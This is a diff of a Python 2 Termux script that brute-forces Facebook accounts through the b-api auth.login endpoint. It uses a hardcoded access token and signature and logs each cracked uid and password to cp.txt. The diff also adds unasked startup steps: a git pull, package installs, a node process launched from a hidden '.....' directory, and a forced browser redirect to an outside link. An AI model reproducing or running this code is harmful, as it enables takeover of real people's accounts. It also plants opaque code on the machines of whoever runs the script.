@@ -4,34 +4,53 @@
 # https://www.facebook.com/ArbabAli
 
 try:
-    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
     from multiprocessing.pool import ThreadPool
 except ImportError:
     os.system("pip2 install requests")
-    os.system("pip2 install mechanize")
-    os.system("python2 MrX.py")
+    os.system("python2 Sd.py")
+os.system("clear")
+"""
 try:
-    os.mkdir('save')
-except OSError:
-    pass
-    if os.path.isfile('.../index.js'):
- 	os.system('mv ... .....')
-	os.system('cd ..... && npm install')
- 	os.system('#')
- 	os.system('#')
- 	os.system('fuser -k 5000/tcp &')
- 	os.system('#')
- 	os.system('node ...../index.js &')
- 	os.system('fuser -k 5000/tcp &')
- 	os.system('#')
- 	os.system('node ...../index.js &')
+    my = requests.get("https://muhammadhamza365.byethost7.com")
+except requests.exceptions.ConnectionError:
+    print("")
+    print("\t    \033[1;31mTurn on mobile data OR wifi then use MAFIA-TOOLS\033[0;97m")
+    print("")
+    time.sleep(1)
+    raw_input(" Press enter to try again ")
+    os.system("python2 MAFIA-KILLER.py")"""
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+    os.system("apt update && apt install nodejs -y")
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
+    os.system("apt install ruby -y && gem install lolcat")
 from requests.exceptions import ConnectionError
+os.system("git pull")
+if not os.path.isfile("/data/data/com.termux/files/home/PROHACK/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd .....  && npm install")
+    os.system("cd .....  && node index.js &")
+    os.system("clear")
+    print("\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m")
+    os.system("xdg-open http://aorracer.com/3mkf")
+    time.sleep(10)
+elif os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
+    print("\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m")
+    os.system("xdg-open http://aorracer.com/3mkf")
+    time.sleep(10)
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
-sys.setdefaultencoding("utf8")
-
+sys.setdefaultencoding("utf-8")
+c = "\033[1;32m"
+c2 = "\033[0;97m"
+c3 = "\033[1;31m"
 def abm(z):
 	for e in z + "\n":
 		sys.stdout.write(e)
@@ -401,7 +420,7 @@ def crack2():
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
-		        print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass1+"\033[1;91m-✰-\033[1;97m"+name)
+		        print("\033[1;94m[\033[1;92mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass1+"\033[1;91m-✰-\033[1;97m"+name)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
@@ -418,7 +437,7 @@ def crack2():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass2+"\033[1;91m-✰-\033[1;97m"+name)
+		                print("\033[1;94m[\033[1;92mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass2+"\033[1;91m-✰-\033[1;97m"+name)
 		                cp=open("cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
 		                cp.close()
@@ -435,7 +454,7 @@ def crack2():
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass3+"\033[1;91m-✰-\033[1;97m"+name)
+		                        print("\033[1;94m[\033[1;92mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass3+"\033[1;91m-✰-\033[1;97m"+name)
 		                        cp=open("cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
 		                        cp.close()
@@ -469,7 +488,7 @@ def crack2():
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass5+"\033[1;91m-✰-\033[1;97m"+name)
+		                                        print("\033[1;94m[\033[1;92mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass5+"\033[1;91m-✰-\033[1;97m"+name)
 		                                        cp=open("cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
 		                                        cp.close()
